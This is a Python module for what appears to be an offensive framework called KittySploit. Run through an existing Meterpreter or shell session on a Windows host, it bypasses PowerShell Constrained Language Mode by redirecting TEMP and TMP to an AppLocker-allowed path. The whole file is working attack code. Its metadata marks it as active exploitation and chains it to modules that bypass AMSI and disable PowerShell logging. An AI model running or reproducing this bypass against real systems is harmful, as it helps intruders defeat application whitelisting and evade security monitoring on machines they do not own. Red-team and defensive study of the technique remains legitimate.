#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows PowerShell CLM Bypass (TEMP redirect)",
        "description": (
            "Bypass PowerShell Constrained Language Mode by launching a child "
            "powershell.exe with TEMP/TMP redirected to an AppLocker-allowed "
            "path (default C:\\Windows\\Temp). PowerShell probes AppLocker script "
            "rules via a temp script; an allowed TEMP yields FullLanguage."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://redteamrecipes.com/blog/2025/11/Evasion/",
            "https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.2,
            "noise": 0.4,
            "value": 1.0,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": [],
                "suggested_followups": [
                    "post/shell/windows/manage/amsi_bypass",
                    "post/shell/windows/manage/disable_ps_logging",
                ],
            },
        },
    }

    temp_path = OptString(
        r"C:\Windows\Temp",
        "Allowed path to use as TEMP/TMP for the new PowerShell process",
        False,
    )
    verify = OptBool(True, "Check LanguageMode of current session first", False)

    def _language_mode(self) -> str:
        out = self.win_run_powershell(
            "$ExecutionContext.SessionState.LanguageMode.ToString()",
            timeout=10,
        )
        if not out:
            return ""
        return out.strip().splitlines()[-1].strip()

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        temp = str(self.temp_path or r"C:\Windows\Temp").strip().rstrip("\\")
        temp_q = self.win_ps_single_quote(temp)

        if self.verify:
            before = self._language_mode()
            if before:
                print_info(f"Current LanguageMode: {before}")
                if before.lower() == "fulllanguage":
                    print_success("Already FullLanguage — CLM bypass not needed.")
                    return True

        print_status(f"Probing child PowerShell with TEMP/TMP={temp}")
        script = (
            "$ErrorActionPreference='Stop';"
            "$psi=New-Object System.Diagnostics.ProcessStartInfo;"
            "$psi.FileName=\"$PSHOME\\powershell.exe\";"
            "$psi.Arguments='-NoP -NoLogo -Command \"$ExecutionContext.SessionState.LanguageMode.ToString()\"';"
            "$psi.UseShellExecute=$false;"
            "$psi.RedirectStandardOutput=$true;"
            "$psi.RedirectStandardError=$true;"
            "$psi.CreateNoWindow=$true;"
            f"$psi.EnvironmentVariables['TEMP']='{temp_q}';"
            f"$psi.EnvironmentVariables['TMP']='{temp_q}';"
            "$p=[Diagnostics.Process]::Start($psi);"
            "$out=$p.StandardOutput.ReadToEnd();"
            "$null=$p.WaitForExit(20000);"
            "Write-Output ('CHILD_MODE:'+$out.Trim())"
        )
        out = self.win_run_powershell(script, timeout=30)
        child = ""
        for line in (out or "").splitlines():
            if line.startswith("CHILD_MODE:"):
                child = line.split(":", 1)[1].strip()
                break

        if not child:
            print_error("Could not determine child LanguageMode")
            print_debug(out or "")
            return False

        print_info(f"Child LanguageMode with redirected TEMP: {child}")
        if child.lower() == "fulllanguage":
            print_success("CLM bypass succeeded (child is FullLanguage).")
            print_info(
                f"Use TEMP={temp} and TMP={temp} when spawning interactive PowerShell."
            )
            return True

        print_warning(
            f"Child still constrained — AppLocker may not allow scripts under {temp}, "
            "or Device Guard UMCI is independent of TEMP."
        )
        return False
